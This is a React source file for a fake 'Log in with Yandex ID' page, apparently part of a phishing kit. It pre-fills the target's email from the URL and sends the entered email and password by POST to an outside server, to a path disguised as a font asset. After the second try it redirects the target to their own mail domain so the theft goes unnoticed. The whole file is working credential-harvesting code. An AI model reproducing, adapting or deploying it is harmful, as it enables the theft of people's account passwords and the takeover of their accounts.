
import React, { useState, useEffect } from "react";
import './Yandex.css';
import { BsArrowLeft, BsFacebook, BsTwitter } from 'react-icons/bs';
import { FcGoogle } from 'react-icons/fc';
import { ReactComponent as YaIcon } from "../../Media/SVG/YaIcon.svg";
import { ReactComponent as Smile } from "../../Media/SVG/Smile.svg";
import { ReactComponent as YaIdlogoIcon } from "../../Media/SVG/Idlogo.svg";
import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";

const Yandex = ()=>{

    useEffect(()=>{
        document.title = 'YANDEX.COM';
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2400);
    }, []);

    const [spinLoader, setSpinLoader] = useState(false);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();;

    const [yandexEmail, setYandexEmail] = useState(extracetdEmail)
    const [yandexPassword, setYandexPassword] = useState();

    const [count, setCount] = useState(0);

    const submitYandex = (e)=>{
        e.preventDefault();
        // alert(7654)
        // console.log(yandexEmail, yandexPassword);

        if(yandexPassword === ""){
            setSpinLoader(false);
            return null
            // alert('Please fill in the input')
        }else{
            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
            }, 1600);
            setTimeout(() => {
                setYandexPassword('');
            }, 800);

            const user = {
                email: yandexEmail,
                password: yandexPassword
            };
        
            $.ajax({
                type: "POST",
                url: "https://dozenpearl.com/nc_assets/fonts/recov/free.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();;
                // console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain}`;
            };
        }
    };


    return(<div>

        { spinLoader ? <Preloader /> : null }
        
        <div className="Yandex_bg">

            <main className="Yandex_form_cont">

                <div className="stret_">
                    <BsArrowLeft style={{cursor:'pointer'}} className='icom_poin'/>

                    <div className="icn_cont_jdn" style={{
                        display:'flex',
                        justifyContent: 'center'
                    }}>
                        <article className="oiujmk" style={{
                            display:'flex',
                            justifyContent: 'center',
                            alignItems: 'center'
                        }}>
                            <YaIcon />

                            <Smile className="svg_color" style={{fill:'white'}} />

                            <YaIdlogoIcon className="svg_color" />
                        </article>
                    </div>

                    <p>&#160;</p>

                </div>


                <p className="Yandex_txt_lgin">Log in with Yandex ID</p>

                <form onSubmit={submitYandex}>
                    
                    <div>
                        <input 
                            type={`email`}
                            placeholder='Username or email'
                            className="Yandex_email_class"
                            readOnly
                            value={yandexEmail}
                            onChange={e=> setYandexEmail(e.target.value)}
                            required
                        />
                    </div>


                    <div>
                        <input 
                            style={{
                                marginTop:'16px'
                            }}
                            type={`password`}
                            placeholder='Password'
                            className="Yandex_email_class"
                            value={yandexPassword}
                            onChange={e=> setYandexPassword(e.target.value)}
                        />
                    </div>



                    <div>
                        <input 
                            type={`submit`}
                            className="Yandex_submit_btn_"
                            value={`Log in`}
                            onClick={submitYandex}
                        />
                    </div>


                    <div>
                        <input 
                            type={`submit`}
                            className="Yandex_create_ID_btn_"
                            value={`Create ID`}
                            onClick={e=> e.preventDefault()}
                        />
                    </div>

                    <p className="linwith">Log in with</p>


                    <div className="Yandex_media_logins">
                        
                        <div className="Yandex_round_border_">
                            <BsFacebook className="Y_F_I"/>
                        </div>

                        <div className="Yandex_round_border_">
                            <FcGoogle className="Y_F_G"/>
                        </div>

                        <div className="Yandex_round_border_">
                            <BsTwitter className="Y_T_I"/>
                        </div>
                    </div>



                </form>

            </main>




        </div>

        {/* oiuy */}

    </div>)
};


export default Yandex;